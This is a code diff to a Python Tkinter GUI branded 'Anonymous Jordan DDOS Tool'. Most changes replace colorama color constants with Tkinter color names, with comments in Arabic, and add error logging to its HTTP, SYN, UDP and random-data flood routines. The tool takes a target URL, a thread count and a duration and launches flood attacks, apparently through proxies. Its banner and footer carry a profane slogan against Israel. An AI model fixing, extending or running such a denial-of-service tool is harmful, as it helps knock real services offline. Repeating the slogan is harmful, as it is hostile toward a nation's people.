@@ -4,21 +4,21 @@ import random
 import time
 import ssl
 from urllib.parse import urlparse
-from colorama import Fore, Back, Style, init
 import tkinter as tk
 from tkinter import ttk, messagebox
 from datetime import datetime
 import webbrowser
 
-# Initialize colorama
-init(autoreset=True)
+# لا تحتاج لتغيير شيء هنا، فقط لعرض النصوص الملونة في الـ Terminal
+from colorama import Fore, Back, Style, init as colorama_init
+colorama_init(autoreset=True)
 
 class DDoSAttackGUI:
     def __init__(self, root):
         self.root = root
         self.root.title("Anonymous Jordan DDOS Tool")
         self.root.geometry("900x600")
-        self.root.configure(bg=Fore.BLACK)
+        self.root.configure(bg="black")  # ✅ استخدم اسم اللون مباشرة أو HEX
         
         # Attack stats
         self.success_count = 0
@@ -37,9 +37,9 @@ class DDoSAttackGUI:
         self.create_banner()
         self.create_widgets()
         self.create_footer()
-        
+    
     def create_banner(self):
-        banner_frame = tk.Frame(self.root, bg=Fore.BLACK)
+        banner_frame = tk.Frame(self.root, bg="black")
         banner_frame.pack(pady=10)
         
         banner_text = r"""
@@ -55,8 +55,8 @@ class DDoSAttackGUI:
             banner_frame,
             text=banner_text,
             font=("Courier", 12),
-            fg=Fore.RED,
-            bg=Fore.BLACK,
+            fg="red",  # ✅ استخدام اسم اللون
+            bg="black",
             justify="center"
         )
         banner_label.pack()
@@ -65,70 +65,70 @@ class DDoSAttackGUI:
             banner_frame,
             text="Anonymous Jordan DDoS Tool - Fuck Isreal",
             font=("Arial", 14, "bold"),
-            fg=Fore.GREEN,
-            bg=Fore.BLACK
+            fg="green",  # ✅ استخدام اسم اللون
+            bg="black"
         )
         subtitle_label.pack()
     
     def create_widgets(self):
-        main_frame = tk.Frame(self.root, bg=Fore.BLACK)
+        main_frame = tk.Frame(self.root, bg="black")
         main_frame.pack(pady=20, padx=20, fill="both", expand=True)
         
         # Target input
-        target_frame = tk.Frame(main_frame, bg=Fore.BLACK)
+        target_frame = tk.Frame(main_frame, bg="black")
         target_frame.pack(fill="x", pady=10)
         
-        tk.Label(target_frame, text="Target URL:", fg=Fore.CYAN, bg=Fore.BLACK, width=15).pack(side="left")
+        tk.Label(target_frame, text="Target URL:", fg="cyan", bg="black", width=15).pack(side="left")
         self.target_entry = tk.Entry(target_frame, width=50, font=("Arial", 12))
         self.target_entry.pack(side="left", expand=True, fill="x")
         self.target_entry.insert(0, "https://example.com")
         
         # Attack options
-        options_frame = tk.Frame(main_frame, bg=Fore.BLACK)
+        options_frame = tk.Frame(main_frame, bg="black")
         options_frame.pack(fill="x", pady=10)
         
         # Port
-        port_frame = tk.Frame(options_frame, bg=Fore.BLACK)
+        port_frame = tk.Frame(options_frame, bg="black")
         port_frame.pack(fill="x", pady=5)
-        tk.Label(port_frame, text="Port:", fg=Fore.CYAN, bg=Fore.BLACK, width=15).pack(side="left")
+        tk.Label(port_frame, text="Port:", fg="cyan", bg="black", width=15).pack(side="left")
         self.port_var = tk.IntVar(value=80)
         self.port_entry = tk.Entry(port_frame, textvariable=self.port_var, width=10)
         self.port_entry.pack(side="left")
         
         # Duration
-        duration_frame = tk.Frame(options_frame, bg=Fore.BLACK)
+        duration_frame = tk.Frame(options_frame, bg="black")
         duration_frame.pack(fill="x", pady=5)
-        tk.Label(duration_frame, text="Duration (seconds):", fg=Fore.CYAN, bg=Fore.BLACK, width=15).pack(side="left")
+        tk.Label(duration_frame, text="Duration (seconds):", fg="cyan", bg="black", width=15).pack(side="left")
         self.duration_var = tk.IntVar(value=60)
         self.duration_entry = tk.Entry(duration_frame, textvariable=self.duration_var, width=10)
         self.duration_entry.pack(side="left")
         
         # Threads
-        threads_frame = tk.Frame(options_frame, bg=Fore.BLACK)
+        threads_frame = tk.Frame(options_frame, bg="black")
         threads_frame.pack(fill="x", pady=5)
-        tk.Label(threads_frame, text="Threads:", fg=Fore.CYAN, bg=Fore.BLACK, width=15).pack(side="left")
+        tk.Label(threads_frame, text="Threads:", fg="cyan", bg="black", width=15).pack(side="left")
         self.threads_var = tk.IntVar(value=50)
         self.threads_entry = tk.Entry(threads_frame, textvariable=self.threads_var, width=10)
         self.threads_entry.pack(side="left")
         
         # Attack mode
-        attack_mode_frame = tk.Frame(options_frame, bg=Fore.BLACK)
+        attack_mode_frame = tk.Frame(options_frame, bg="black")
         attack_mode_frame.pack(fill="x", pady=5)
-        tk.Label(attack_mode_frame, text="Attack Mode:", fg=Fore.CYAN, bg=Fore.BLACK, width=15).pack(side="left")
+        tk.Label(attack_mode_frame, text="Attack Mode:", fg="cyan", bg="black", width=15).pack(side="left")
         self.attack_mode = ttk.Combobox(attack_mode_frame, values=["HTTP Flood", "SYN Flood", "UDP Flood", "Random Data Flood"], width=20)
         self.attack_mode.set("HTTP Flood")
         self.attack_mode.pack(side="left")
         
         # Attack buttons
-        button_frame = tk.Frame(main_frame, bg=Fore.BLACK)
+        button_frame = tk.Frame(main_frame, bg="black")
         button_frame.pack(pady=20)
         
         self.start_button = tk.Button(
             button_frame, 
             text="Start Attack", 
             command=self.start_attack, 
-            bg=Fore.GREEN, 
-            fg=Fore.BLACK, 
+            bg="green",  # ✅ استخدام اسم اللون
+            fg="black", 
             width=15, 
             font=("Arial", 12, "bold")
         )
@@ -138,8 +138,8 @@ class DDoSAttackGUI:
             button_frame, 
             text="Stop Attack", 
             command=self.stop_attack, 
-            bg=Fore.RED, 
-            fg=Fore.BLACK, 
+            bg="red",  # ✅ استخدام اسم اللون
+            fg="black", 
             width=15, 
             font=("Arial", 12, "bold"),
             state=tk.DISABLED
@@ -147,15 +147,15 @@ class DDoSAttackGUI:
         self.stop_button.pack(side="left", padx=5)
         
         # Status display
-        status_frame = tk.Frame(main_frame, bg=Fore.BLACK)
+        status_frame = tk.Frame(main_frame, bg="black")
         status_frame.pack(fill="both", expand=True)
         
         self.status_text = tk.Text(
             status_frame, 
             height=15, 
             width=80, 
-            bg=Fore.BLACK, 
-            fg=Fore.WHITE, 
+            bg="black", 
+            fg="white", 
             font=("Courier", 10),
             state="disabled"
         )
@@ -164,26 +164,32 @@ class DDoSAttackGUI:
         scrollbar = ttk.Scrollbar(status_frame, command=self.status_text.yview)
         scrollbar.pack(side="right", fill="y")
         self.status_text.configure(yscrollcommand=scrollbar.set)
+        
+        # ✅ إعداد Tags ملونة للكتابة في Text Widget
+        self.status_text.tag_config("info", foreground="cyan")
+        self.status_text.tag_config("success", foreground="green")
+        self.status_text.tag_config("error", foreground="red")
+        self.status_text.tag_config("summary", foreground="yellow")
     
     def create_footer(self):
-        footer_frame = tk.Frame(self.root, bg=Fore.BLACK)
+        footer_frame = tk.Frame(self.root, bg="black")
         footer_frame.pack(side="bottom", fill="x", pady=10)
         
         footer_label = tk.Label(
             footer_frame,
             text="Fuck Isreal | DDoS Tool Made By Anonymous Jordan Team | All Attacks Under Supervision",
-            fg=Fore.MAGENTA,
-            bg=Fore.BLACK,
+            fg="magenta",
+            bg="black",
             font=("Arial", 10, "italic"),
             cursor="hand2"
         )
         footer_label.pack()
         footer_label.bind("<Button-1>", lambda e: webbrowser.open("https://anonymousjordan.org"))
     
-    def log(self, message, color=Fore.WHITE):
+    def log(self, message, tag="info"):
         self.status_text.config(state="normal")
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        self.status_text.insert("end", f"[{timestamp}] {message}\n", color)
+        self.status_text.insert("end", f"[{timestamp}] {message}\n", tag)
         self.status_text.config(state="disabled")
         self.status_text.see("end")
     
@@ -276,9 +282,10 @@ class DDoSAttackGUI:
             with self.lock:
                 self.total_requests += 1
                 
-        except:
+        except Exception as e:
             with self.lock:
                 self.fail_count += 1
+            self.log(f"Failed to send request through proxy {proxy}: {str(e)}", "error")
         
         finally:
             with self.lock:
@@ -301,10 +308,11 @@ class DDoSAttackGUI:
                 self.success_count += 1
                 self.total_requests += 1
                 
-        except:
+        except Exception as e:
             with self.lock:
                 self.fail_count += 1
                 self.total_requests += 1
+            self.log(f"SYN Flood failed: {str(e)}", "error")
     
     def udp_flood(self, proxy=None):
         try:
@@ -325,10 +333,11 @@ class DDoSAttackGUI:
                 self.success_count += 10  # Count each packet as a success
                 self.total_requests += 10
                 
-        except:
+        except Exception as e:
             with self.lock:
                 self.fail_count += 10
                 self.total_requests += 10
+            self.log(f"UDP Flood failed: {str(e)}", "error")
     
     def random_data_flood(self, proxy=None):
         try:
@@ -351,10 +360,11 @@ class DDoSAttackGUI:
                 self.success_count += 5
                 self.total_requests += 5
                 
-        except:
+        except Exception as e:
             with self.lock:
                 self.fail_count += 5
                 self.total_requests += 5
+            self.log(f"Random Data Flood failed: {str(e)}", "error")
     
     def attack_loop(self):
         while self.attack_active:
@@ -428,7 +438,7 @@ class DDoSAttackGUI:
         self.stop_button.config(state=tk.NORMAL)
         
         # Log attack start
-        self.log(f"Starting {self.attack_mode.get()} attack on {self.target} for {self.duration} seconds", Fore.CYAN)
+        self.log(f"Starting {self.attack_mode.get()} attack on {self.target} for {self.duration} seconds", "info")
         
         # Start attack threads
         for _ in range(self.threads):
@@ -453,18 +463,18 @@ class DDoSAttackGUI:
         rps = self.total_requests / elapsed if elapsed > 0 else 0
         
         summary = (
-            f"\n{Fore.YELLOW}Attack Summary:"
-            f"\n{Fore.GREEN}Successful Requests: {self.success_count}"
-            f"\n{Fore.RED}Failed Requests: {self.fail_count}"
-            f"\n{Fore.CYAN}Total Requests Sent: {self.total_requests}"
-            f"\n{Fore.BLUE}Duration: {elapsed:.2f} seconds"
-            f"\n{Fore.MAGENTA}Requests Per Second: {rps:.2f}"
+            f"\nSummary:"
+            f"\nSuccessful Requests: {self.success_count}"
+            f"\nFailed Requests: {self.fail_count}"
+            f"\nTotal Requests Sent: {self.total_requests}"
+            f"\nDuration: {elapsed:.2f} seconds"
+            f"\nRequests Per Second: {rps:.2f}"
         )
-        self.log(summary, Fore.YELLOW)
+        self.log(summary, "summary")
         
         # Reset stats bar
         self.status_bar.config(text="")
-
+    
     def create_status_bar(self):
         self.status_bar = tk.Label(
             self.root, 
@@ -472,8 +482,8 @@ class DDoSAttackGUI:
             bd=1, 
             relief=tk.SUNKEN, 
             anchor=tk.W,
-            bg=Fore.BLACK,
-            fg=Fore.WHITE
+            bg="black",
+            fg="white"
         )
         self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
 
